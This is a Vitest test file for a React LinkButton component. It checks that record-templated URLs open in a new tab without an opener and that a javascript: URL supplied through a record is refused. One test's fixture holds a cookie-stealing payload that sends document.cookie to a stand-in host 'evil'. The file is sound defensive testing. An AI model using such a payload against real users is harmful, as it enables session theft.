import React from 'react';
import {afterEach, beforeEach, describe, expect, it, vi} from 'vitest';
import {createLightTheme} from '@design/theme';
import {ThemeProvider} from '@mui/material';
import {render, screen} from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import {LinkButton} from '../LinkButton';

const mocks = vi.hoisted(() => ({record: {} as Record<string, unknown>}));

vi.mock('react-admin', () => ({
  useRecordContext: () => mocks.record,
  useTranslate: () => (key: string, options?: {_?: string}) => options?._ ?? key,
}));

const wrapper = ({children}: {children: React.ReactNode}) => (
  <ThemeProvider theme={createLightTheme()}>{children}</ThemeProvider>
);

describe('LinkButton', () => {
  let open: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    open = vi.spyOn(window, 'open').mockReturnValue(null);
    vi.spyOn(console, 'warn').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('opens a URL templated from the record in a new tab, without an opener', async () => {
    mocks.record = {id: 1, website: 'https://example.com/shop'};
    render(<LinkButton label={'Website'} url={'%{data.website}'} />, {wrapper});

    await userEvent.click(screen.getByRole('button'));

    expect(open).toHaveBeenCalledWith('https://example.com/shop', '_blank', 'noopener,noreferrer');
  });

  it('refuses a javascript: URL smuggled in through a record value', async () => {
    mocks.record = {id: 1, website: "javascript:fetch('//evil?c='+document.cookie)"};
    render(<LinkButton label={'Website'} url={'%{data.website}'} />, {wrapper});

    await userEvent.click(screen.getByRole('button'));

    expect(open).not.toHaveBeenCalled();
  });

  it('opens in the current tab for the self target', async () => {
    mocks.record = {id: 1};
    render(<LinkButton label={'Orders'} url={'/shop/orders'} target={'self'} />, {wrapper});

    await userEvent.click(screen.getByRole('button'));

    expect(open).toHaveBeenCalledWith('/shop/orders', '_self', 'noopener,noreferrer');
  });
});
